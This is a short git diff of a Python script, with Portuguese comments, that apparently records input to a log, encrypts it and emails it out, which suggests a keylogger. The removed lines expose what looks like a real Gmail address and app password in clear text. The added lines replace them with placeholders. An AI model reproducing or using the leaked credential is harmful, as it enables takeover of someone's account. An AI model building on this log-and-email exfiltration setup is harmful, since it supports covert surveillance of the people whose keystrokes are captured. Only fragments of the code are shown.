@@ -14,9 +14,9 @@ CAMINHO_LOG = "log.txt"                  # Arquivo de log temporário
 CAMINHO_LOG_CRIPTO = "log_encrypted.txt" # Arquivo criptografado
 CAMINHO_CHAVE = "chave.key"              # Chave de criptografia
 
-EMAIL_REMETENTE = "eduardosbarroso73@gmail.com"
-EMAIL_SENHA = "usjl akdi upkn zxlg"
-EMAIL_DESTINATARIO = "eduardosbarroso73@gmail.com"
+EMAIL_REMETENTE = "seuemail@gmail.com"
+EMAIL_SENHA = "senha de app do seu email"
+EMAIL_DESTINATARIO = "seuemail@gmail.com"
 
 INTERVALO_GRAVACAO = 5  # segundos entre gravações do buffer
 
@@ -112,4 +112,5 @@ if __name__ == "__main__":
 
     # Após encerramento, criptografa e envia o log
     criptografar_log()
+
     enviar_email()
